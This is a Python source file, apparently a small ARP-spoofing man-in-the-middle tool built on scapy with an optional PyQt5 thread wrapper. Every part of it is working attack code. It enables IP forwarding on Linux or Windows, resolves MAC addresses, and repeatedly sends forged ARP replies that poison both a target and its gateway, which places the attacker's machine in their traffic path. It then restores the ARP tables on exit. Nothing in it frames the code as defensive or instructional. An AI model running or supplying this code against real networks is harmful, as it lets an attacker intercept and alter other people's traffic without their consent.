import scapy.all
import os,sys
from PyQt5 import QtCore
import time,subprocess as sp
try:
    import win32serviceutil
except:
    pass

class Arp_SpoofMITM():

    def __init__(self):
        pass

    def linux_ipforwd(self):

        ip_forward_path = "/proc/sys/net/ipv4/ip_forward"
        with open(ip_forward_path) as f:
            if f.read() == 1:
                return
        with open(ip_forward_path, "w") as f:
            print(1, file=f)

    def windows_ipforwd(self):
        if not win32serviceutil.QueryServiceStatus("RemoteAccess")[1] == 4:
            win32serviceutil.StartService("RemoteAccess")
            time.sleep(1)

    def is_ipforwd(self, verbose=True):

        if verbose:
            print("[!] enabling ip forward...")
        self.windows_ipforwd() if "nt" in os.name else self.linux_ipforwd()
        if verbose:
            print("[!] ip forward is enabled.")

    def find_MacAddress(self, ip):
        mac, _ = scapy.all.srp(scapy.all.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.all.ARP(pdst=ip), timeout=3, verbose=0)
        if mac:
            return mac[0][1].src

    def start_spoofing(self, target_ip, host_ip, show_running=True):
        target_mac = self.find_MacAddress(target_ip)
        arp_response = scapy.all.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
        scapy.all.send(arp_response, verbose=0)
        if show_running:
            self_mac = scapy.all.ARP().hwsrc
            print("[+] Sent to "+target_ip+" : "+host_ip+" is-at "+self_mac)

    def resete_target(self, target_ip, host_ip, show_running=True):
        target_mac = self.find_MacAddress(target_ip)
        host_mac = self.find_MacAddress(host_ip)
        arp_response = scapy.all.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
        scapy.all.send(arp_response, verbose=0, count=7)
        if show_running:
            print("[+] Sent to "+target_ip+" : "+host_ip+" is-at "+host_mac)

class GUI(QtCore.QThread):
        Gui_Date_output = QtCore.pyqtSignal(object)
        def __init__(self, target, host) -> None:
            QtCore.QThread.__init__(self)
            self.target = target
            self.host = host
            self.show_running=True
            self.arping = Arp_SpoofMITM()
            self.arping.is_ipforwd()

        def start_spoofing(self, target_ip, host_ip, show_running=True):
            target_mac = self.arping.find_MacAddress(target_ip)
            arp_response = scapy.all.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
            scapy.all.send(arp_response, verbose=0)
            if show_running:
                self_mac = scapy.all.ARP().hwsrc
                print("[+] Sent to "+target_ip+" : "+host_ip+" is-at "+self_mac)
                self.Gui_Date_output.emit((str("[+] Sent to "+target_ip+" : "+host_ip+" is-at "+self_mac)))
                time.sleep(1)
                QtCore.QCoreApplication.processEvents()

        def resete_target(self, target_ip, host_ip, show_running=True):
            target_mac = self.arping.find_MacAddress(target_ip)
            host_mac = self.arping.find_MacAddress(host_ip)
            arp_response = scapy.all.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
            scapy.all.send(arp_response, verbose=0, count=7)
            if show_running:
                print("[+] Sent to "+target_ip+" : "+host_ip+" is-at "+host_mac)
                self.Gui_Date_output.emit((str("[+] Sent to "+target_ip+" : "+host_ip+" is-at "+host_mac)))
                time.sleep(1)
                QtCore.QCoreApplication.processEvents()

        def run(self) -> None:
            try:
                while True:
                    self.start_spoofing(self.target, self.host, self.show_running)
                    self.start_spoofing(self.host, self.target, self.show_running)
                    time.sleep(1)
            except:
                self.resete_target(self.target, self.host)
                self.resete_target(self.host, self.target)
if __name__ == "__main__":
    target =str(input("enter target_ip: "))
    host = str(input("enter Gateway_ip: "))
    show_running = True
    arping = Arp_SpoofMITM()
    arping.is_ipforwd()
    try:
        while True:
            arping.start_spoofing(target, host, show_running)
            arping.start_spoofing(host, target, show_running)
            time.sleep(1)
    except:
        print("resting the network")
        arping.resete_target(target, host)
        arping.resete_target(host, target)